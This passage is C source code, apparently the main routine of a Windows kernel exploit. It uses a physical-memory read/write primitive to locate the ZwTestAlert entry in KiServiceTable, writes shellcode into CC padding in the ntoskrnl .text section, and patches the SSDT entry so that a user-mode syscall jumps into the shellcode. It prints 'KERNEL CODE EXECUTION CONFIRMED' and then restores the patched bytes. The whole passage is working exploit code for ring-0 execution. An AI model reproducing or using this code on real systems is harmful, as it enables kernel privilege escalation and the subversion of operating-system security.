    uint32_t ssn = get_nt_ssn("ZwTestAlert");
    if (!ssn) ssn = get_nt_ssn("ZwYieldExecution");
    if (!ssn) ssn = get_nt_ssn("ZwGetCurrentProcessorNumber");
    if (!ssn) { printf("[-] No suitable syscall found\n"); return 1; }

    uint32_t ssdt_idx = ssn & 0xFFF;
    printf("  [*] SSDT index = %u\n", ssdt_idx);

    uint64_t entry_pa = kisvc_pa + (uint64_t)ssdt_idx * 4;
    uint64_t entry_va = kisvc_va + (uint64_t)ssdt_idx * 4;
    printf("  [*] Entry PA = 0x%012"PRIX64"  VA = 0x%016"PRIX64"\n",
           entry_pa, entry_va);

    int32_t orig_entry = 0;
    if (!phys_read(entry_pa, &orig_entry, 4)) {
        printf("[-] phys_read(SSDT entry) failed\n"); return 1;
    }
    printf("  [*] Original encoded entry = 0x%08X\n", (uint32_t)orig_entry);

    int64_t  delta_orig = (int64_t)((int32_t)orig_entry >> 4);
    uint64_t orig_fn_va = (uint64_t)((int64_t)kisvc_va + delta_orig);
    printf("  [*] Original fn VA = 0x%016"PRIX64"\n", orig_fn_va);

    if ((orig_fn_va >> 48) != 0xFFFF) {
        printf("[!] orig_fn_va looks invalid (bad SSDT entry or wrong table PA)\n");
        return 1;
    }

    /* ── Find CC padding in ntoskrnl .text (executable, for shellcode) ── */
    printf("\n[*] Scanning ntoskrnl .text for CC-padded executable region...\n");
    uint64_t sc_va = 0, sc_pa = 0;
    uint8_t  sc_saved[SHELLCODE_REGION_SIZE];
    if (!find_cc_region(nt_phys, nt->va_base, nt->size,
                         "C:\\Windows\\System32\\ntoskrnl.exe",
                         &sc_va, &sc_pa, sc_saved)) return 1;

    int64_t sc_delta = (int64_t)sc_va - (int64_t)kisvc_va;
    printf("  [*] sc_delta = %.2f MB\n", (double)sc_delta / (1024*1024));
    if (sc_delta > (int64_t)0x07FFFFFF || sc_delta < -(int64_t)0x08000000) {
        printf("[-] Delta exceeds ±128MB\n"); return 1;
    }

    /* ── Find zero region in ntoskrnl .data (writable, for signal) ───── */
    printf("\n[*] Scanning ntoskrnl .data for zero signal region...\n");
    uint64_t signal_va = 0, signal_pa = 0;
    uint8_t  sig_saved[SIGNAL_REGION_SIZE];
    if (!find_zero_signal_region(nt_phys, nt->va_base, nt->size,
                                  "C:\\Windows\\System32\\ntoskrnl.exe",
                                  &signal_va, &signal_pa, sig_saved)) return 1;

    /* ── Build shellcode ──────────────────────────────────────────── */
    printf("\n[*] Building shellcode...\n");
    uint8_t sc[64] = {0};
    int sc_len = build_shellcode(sc, sizeof sc, signal_va, orig_fn_va);
    if (!sc_len) { printf("[-] Shellcode build failed\n"); return 1; }

    /* ── Write shellcode to .text CC region via PA ────────────────── */
    printf("\n[*] Writing shellcode to PA 0x%012"PRIX64"...\n", sc_pa);
    if (!phys_write(sc_pa, sc, (uint32_t)sc_len)) {
        printf("[-] phys_write shellcode failed\n"); return 1;
    }
    printf("[+] Shellcode written\n");

    /* ── Encode + verify SSDT entry ───────────────────────────────── */
    int32_t new_entry = (int32_t)(sc_delta << 4);
    uint64_t verify_va = (uint64_t)((int64_t)kisvc_va + ((int32_t)new_entry >> 4));
    if (verify_va != sc_va) { printf("[-] Encode/decode mismatch\n"); return 1; }
    printf("[*] New encoded entry = 0x%08X  (verified)\n", (uint32_t)new_entry);

    /* ── Patch SSDT entry via PA ──────────────────────────────────── */
    printf("\n[*] Patching KiServiceTable[%u] → shellcode...\n", ssdt_idx);
    if (!phys_write(entry_pa, &new_entry, 4)) {
        printf("[-] phys_write(SSDT entry) failed\n"); return 1;
    }
    printf("[+] SSDT patched. Triggering in 10ms...\n");
    Sleep(10);

    /* ── Trigger ──────────────────────────────────────────────────── */
    typedef NTSTATUS (NTAPI *ZwTestAlert_t)(void);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    ZwTestAlert_t fn_trigger = (ZwTestAlert_t)GetProcAddress(ntdll, "ZwTestAlert");
    if (!fn_trigger)
        fn_trigger = (ZwTestAlert_t)GetProcAddress(ntdll, "ZwYieldExecution");
    printf("[*] Triggering syscall → kernel → shellcode\n");
    if (fn_trigger) fn_trigger();
    Sleep(5);

    /* ── Restore SSDT immediately via PA (before checking signal) ─── */
    printf("[*] Restoring SSDT entry via PA...\n");
    phys_write(entry_pa, &orig_entry, 4);

    /* ── Check signal (read from .data PA) ───────────────────────── */
    uint32_t signal_val = 0;
    phys_read(signal_pa, &signal_val, 4);

    if (signal_val == 1) {
        printf("\n[+] ══════════════════════════════════════════════\n");
        printf("[+]  KERNEL CODE EXECUTION CONFIRMED\n");
        printf("[+]  Shellcode ran at ring-0  signal=0x%X\n", signal_val);
        printf("[+] ══════════════════════════════════════════════\n");
    } else {
        printf("\n[-] Signal=0x%X — shellcode did not run\n", signal_val);
        printf("    Diagnostics:\n");
        printf("    - Shellcode VA  = 0x%016"PRIX64"  PA=0x%012"PRIX64"\n", sc_va, sc_pa);
        printf("    - Signal VA     = 0x%016"PRIX64"  PA=0x%012"PRIX64"\n", signal_va, signal_pa);
        printf("    - SSDT entry PA = 0x%012"PRIX64"\n", entry_pa);
        /* Read back what's at the SSDT entry now */
        int32_t cur_entry = 0;
        phys_read(entry_pa, &cur_entry, 4);
        printf("    - SSDT entry now= 0x%08X (orig=0x%08X)\n",
               (uint32_t)cur_entry, (uint32_t)orig_entry);
    }

    /* ── Cleanup ──────────────────────────────────────────────────── */
    printf("\n[*] Restoring .text CC and .data signal bytes...\n");
    phys_write(sc_pa,     sc_saved,  SHELLCODE_REGION_SIZE);
    phys_write(signal_pa, sig_saved, SIGNAL_REGION_SIZE);
    printf("[+] Done.\n");

    return (signal_val == 1) ? 0 : 1;
}
